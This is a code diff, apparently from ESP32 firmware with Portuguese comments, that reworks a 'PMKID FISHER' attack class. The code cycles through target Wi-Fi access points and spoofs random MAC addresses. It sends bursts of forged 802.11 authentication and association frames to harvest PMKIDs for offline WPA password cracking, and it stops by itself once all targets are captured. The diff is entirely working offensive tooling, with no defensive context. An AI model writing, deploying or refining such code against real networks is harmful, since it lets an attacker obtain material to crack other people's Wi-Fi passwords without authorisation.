@@ -64,60 +64,87 @@ public:
                  " capturados:" + String(captured));
     }
 
-    // Chamado no attackTask a cada iteração
+    // Chamado no attackTask a cada iteração — sem delay() bloqueante
     void tick() {
         if (!running || targets.empty()) return;
-        static size_t idx = 0;
-        static unsigned long nextAt = 0;
-        if (millis() < nextAt) return;
 
-        // Pula alvos já capturados, busca o próximo pendente
-        size_t tried = 0;
-        while (tried < targets.size()) {
-            Target& t = targets[idx % targets.size()];
-            idx++;
-            tried++;
-            // Marca se PMKID já foi capturado para este alvo
-            String bssidStr = Deauther::bssidStr(t.bssid);
-            for (auto& p : Sniffer::get().pmkids)
-                if (p.bssid == bssidStr) { t.captured = true; break; }
-            if (!t.captured) {
-                // Gera MAC falso localmente administrado
-                uint8_t fakeMac[6];
-                esp_fill_random(fakeMac, 6);
-                fakeMac[0] = (fakeMac[0] | 0x02) & 0xFE;
+        unsigned long now = millis();
 
-                esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
-                delay(15); // aguarda rádio estabilizar no canal antes de transmitir
-                _sendAuthRequest(t.bssid, fakeMac);
-                delay(12);
-                _sendAssocRequest(t.bssid, fakeMac, t.ssid);
-
-                t.attempts++;
-                attempts++;
-                captured = (uint32_t)Sniffer::get().pmkids.size();
-
-                // Delay adaptativo: menos espera para APs com sinal forte
-                uint32_t delay_ms = (t.rssi > -60) ? 250 : (t.rssi > -75) ? 350 : 500;
-                nextAt = millis() + delay_ms;
-
-                if (t.attempts % 5 == 1) // log a cada 5 tentativas por alvo
-                    LOG.data("[PMKID FISHER] #" + String(t.attempts) + " -> " +
-                             bssidStr + " (rssi=" + String(t.rssi) + ")");
+        // Sub-estados para Auth→Assoc sem bloquear a task
+        switch (_ss) {
+            case SS_IDLE: {
+                if (now < _nextAt) return;
+                // Busca próximo alvo não capturado
+                size_t tried = 0;
+                while (tried < targets.size()) {
+                    Target& t = targets[_idx % targets.size()];
+                    _idx++; tried++;
+                    String bs = Deauther::bssidStr(t.bssid);
+                    for (auto& p : Sniffer::get().pmkids)
+                        if (p.bssid == bs) { t.captured = true; break; }
+                    if (!t.captured) {
+                        _curIdx = (_idx - 1) % targets.size();
+                        esp_fill_random(_fakeMac, 6);
+                        _fakeMac[0] = (_fakeMac[0] | 0x02) & 0xFE;
+                        esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
+                        _sendAuthRequest(t.bssid, _fakeMac);
+                        _ss = SS_WAIT_AUTH;
+                        _ssTimer = now;
+                        return;
+                    }
+                }
+                // Todos capturados
+                bool allDone = true;
+                for (auto& t : targets) if (!t.captured) { allDone = false; break; }
+                if (allDone) {
+                    running = false;
+                    LOG.success("[PMKID FISHER] Todos capturados! PMKIDs=" + String(captured));
+                }
                 break;
             }
-        }
-        // Se todos capturados, para automaticamente
-        bool allDone = true;
-        for (auto& t : targets) if (!t.captured) { allDone = false; break; }
-        if (allDone) {
-            running = false;
-            LOG.success("[PMKID FISHER] Todos os " + String(targets.size()) +
-                        " alvos capturados! PMKIDs=" + String(captured));
+            case SS_WAIT_AUTH:
+                if (now - _ssTimer < 20) return;
+                _sendAssocRequest(targets[_curIdx].bssid, _fakeMac, targets[_curIdx].ssid);
+                _ss = SS_WAIT_EAPOL;
+                _ssTimer = now;
+                break;
+
+            case SS_WAIT_EAPOL:
+                if (now - _ssTimer < 80) return;
+                {
+                    Target& t = targets[_curIdx];
+                    t.attempts++;
+                    attempts++;
+                    captured = (uint32_t)Sniffer::get().pmkids.size();
+                    if (t.attempts % 5 == 1)
+                        LOG.data("[PMKID FISHER] #" + String(t.attempts) + " -> " +
+                                 Deauther::bssidStr(t.bssid) + " (rssi=" + String(t.rssi) + ")");
+                    // Enviar 3 pares Auth+Assoc com MACs diferentes antes de pausar
+                    for (int rep = 1; rep < 3; rep++) {
+                        uint8_t m[6]; esp_fill_random(m, 6);
+                        m[0] = (m[0] | 0x02) & 0xFE;
+                        _sendAuthRequest(t.bssid, m);
+                        delayMicroseconds(800);
+                        _sendAssocRequest(t.bssid, m, t.ssid);
+                        delayMicroseconds(800);
+                    }
+                    uint32_t wait = (t.rssi > -60) ? 180 : (t.rssi > -75) ? 280 : 420;
+                    _nextAt = now + wait;
+                    _ss = SS_IDLE;
+                }
+                break;
         }
     }
 
 private:
+    enum SubState { SS_IDLE, SS_WAIT_AUTH, SS_WAIT_EAPOL };
+    SubState      _ss      = SS_IDLE;
+    unsigned long _ssTimer = 0;
+    unsigned long _nextAt  = 0;
+    size_t        _idx     = 0;
+    size_t        _curIdx  = 0;
+    uint8_t       _fakeMac[6] = {};
+
     void _sendAuthRequest(const uint8_t* ap, const uint8_t* sta) {
         uint8_t f[30] = {};
         f[0] = 0xB0; f[1] = 0x00;  // Auth Request
